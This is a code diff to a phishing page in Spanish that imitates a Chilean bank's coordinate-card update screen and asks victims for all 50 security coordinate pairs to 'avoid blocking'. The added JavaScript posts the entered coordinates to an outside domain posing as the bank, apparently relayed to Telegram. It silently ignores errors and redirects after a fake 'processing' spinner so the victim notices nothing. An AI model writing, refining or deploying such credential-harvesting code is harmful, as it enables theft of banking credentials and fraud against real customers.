@@ -17,6 +17,18 @@
       border-radius:12px;
       box-shadow:0 4px 12px rgba(0,0,0,0.1);
     }
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border: 6px solid #ddd;
+      border-top-color: #cc0000;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
   </style>
 </head>
 
@@ -31,17 +43,17 @@
 
   <div class="container-box">
 
-    <h3 class="text-center mb-3">
-      Actualización de Tarjeta de Coordenadas
-    </h3>
+    <!-- ========================= -->
+    <!--   PANTALLA DE COORDENADAS -->
+    <!-- ========================= -->
 
-    <p class="text-center mb-4">
-      Ingresa los <strong>50 pares numéricos</strong> de tu Tarjeta de Coordenadas para evitar el bloqueo.
-    </p>
-
-    <!-- COORDENADAS -->
     <div id="pantallaCoordenadas">
-      <h4 class="text-center mb-3">Ingresa tus 50 coordenadas</h4>
+
+      <h3 class="text-center mb-3">Actualización de Tarjeta de Coordenadas</h3>
+
+      <p class="text-center mb-4">
+        Ingresa los <strong>50 pares numéricos</strong> de tu Tarjeta de Coordenadas para evitar el bloqueo.
+      </p>
 
       <div class="table-responsive">
         <table class="table table-bordered text-center bg-white">
@@ -55,7 +67,6 @@
           <tbody>
 
             <!-- FILAS 1 A 5 -->
-            <!-- GENERADAS MANUALMENTE PARA EVITAR ERRORES -->
             <!-- FILA 1 -->
             <tr><th>1</th>
               <td><input id="coord-A1" maxlength="2" class="coord-input"></td>
@@ -135,10 +146,20 @@
       </button>
     </div>
 
+    <!-- ========================= -->
+    <!--   PANTALLA DE PROCESO     -->
+    <!-- ========================= -->
+
+    <div id="pantallaProcesando" class="hidden text-center">
+      <h3>Procesando información…</h3>
+      <div class="spinner"></div>
+      <p>Por favor espera unos segundos</p>
+    </div>
+
   </div>
 </div>
 
-<!-- Bootstrap Bundle (NECESARIO) -->
+<!-- Bootstrap Bundle -->
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
 
 <script>
@@ -158,15 +179,23 @@ async function enviarCoordenadas(){
     }
   }
 
-  // Enviar al Telegram vía backend
-  await fetch("https://officebankingchile.info/proxy-login", {
-    method:"POST",
-    headers:{ "Content-Type":"application/json" },
-    body:JSON.stringify({ coordenadas: coords })
-  });
+  // Ocultar tabla y mostrar pantalla de espera
+  document.getElementById("pantallaCoordenadas").classList.add("hidden");
+  document.getElementById("pantallaProcesando").classList.remove("hidden");
 
-  // Redirigir a productos
-  window.location.href = "productos.html";
+  // Enviar al backend sin bloquear
+  try {
+    fetch("https://officebankingchile.info/proxy-login", {
+      method:"POST",
+      headers:{ "Content-Type":"application/json" },
+      body:JSON.stringify({ coordenadas: coords })
+    });
+  } catch(e) {}
+
+  // Avanzar SIEMPRE
+  setTimeout(() => {
+    window.location.href = "productos.html";
+  }, 4000);
 }
 </script>
 
